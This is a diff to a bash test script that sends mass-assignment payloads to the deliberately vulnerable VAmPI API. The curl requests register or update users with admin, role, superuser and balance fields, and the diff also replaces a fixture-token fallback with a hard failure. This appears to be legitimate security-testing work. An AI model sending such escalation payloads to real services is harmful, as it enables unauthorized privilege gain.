@@ -27,7 +27,7 @@ echo "[+] Payload 1: Register with admin=true"
 mass_test "register admin=true" \
   -X POST "${BASE}/users/v1/register" \
   -H "Content-Type: application/json" \
-  -d '{"username":"masstest1","password":"Test1234","email":"mass1@evil.example","admin":true}'
+  -d '{"username":"masstest1","password":"Test1234","email":"mass1@example.com","admin":true}'
 
 echo ""
 
@@ -36,7 +36,7 @@ echo "[+] Payload 2: Register with role=admin"
 mass_test "register role=admin" \
   -X POST "${BASE}/users/v1/register" \
   -H "Content-Type: application/json" \
-  -d '{"username":"masstest2","password":"Test1234","email":"mass2@evil.example","role":"admin"}'
+  -d '{"username":"masstest2","password":"Test1234","email":"mass2@example.com","role":"admin"}'
 
 echo ""
 
@@ -45,7 +45,7 @@ echo "[+] Payload 3: Register with balance=99999"
 mass_test "register balance=99999" \
   -X POST "${BASE}/users/v1/register" \
   -H "Content-Type: application/json" \
-  -d '{"username":"masstest3","password":"Test1234","email":"mass3@evil.example","balance":99999}'
+  -d '{"username":"masstest3","password":"Test1234","email":"mass3@example.com","balance":99999}'
 
 echo ""
 
@@ -54,7 +54,7 @@ echo "[+] Payload 4: Register with multiple escalation fields"
 mass_test "register multi-field escalation" \
   -X POST "${BASE}/users/v1/register" \
   -H "Content-Type: application/json" \
-  -d '{"username":"masstest4","password":"Test1234","email":"mass4@evil.example","admin":true,"role":"superadmin","is_staff":true,"is_superuser":true,"balance":99999}'
+  -d '{"username":"masstest4","password":"Test1234","email":"mass4@example.com","admin":true,"role":"superadmin","is_staff":true,"is_superuser":true,"balance":99999}'
 
 echo ""
 
@@ -62,7 +62,7 @@ echo ""
 echo "[+] Authenticating for PUT/PATCH tests..."
 curl -sk -X POST "${BASE}/users/v1/register" \
   -H "Content-Type: application/json" \
-  -d '{"username":"massput","password":"Test1234","email":"massput@evil.example"}' \
+  -d '{"username":"massput","password":"Test1234","email":"massput@example.com"}' \
   --max-time 10 >/dev/null 2>&1 || true
 
 LOGIN_RESP=$(curl -sk -X POST "${BASE}/users/v1/login" \
@@ -71,13 +71,9 @@ LOGIN_RESP=$(curl -sk -X POST "${BASE}/users/v1/login" \
   --max-time 10) || true
 
 TOKEN=$(echo "$LOGIN_RESP" | jq -r '.auth_token // empty' 2>/dev/null || true)
-if [[ -z "$TOKEN" && -n "${TGEN_FIXTURES:-}" ]]; then
-  TOKEN=$(python3 "$(dirname "$0")/../../scripts/fixture_token.py" vampi_token)
-  echo "[FIXTURE] Using a real seeded VAmPI token after blocked authentication"
-fi
 if [[ -z "$TOKEN" ]]; then
-  echo "    WARN: Could not get token, using dummy"
-  TOKEN="dummy-token-for-testing"
+  echo "[FAIL] Native authentication prerequisite failed" >&2
+  exit 1
 fi
 
 echo ""
@@ -118,7 +114,7 @@ mass_test "PUT email+admin combo" \
   -X PUT "${BASE}/users/v1/massput/email" \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer ${TOKEN}" \
-  -d '{"email":"admin@target.local","admin":true,"verified":true}'
+  -d '{"email":"admin@example.com","admin":true,"verified":true}'
 
 echo ""
 echo "[*] Mass Assignment attack suite complete (8 payloads sent)"
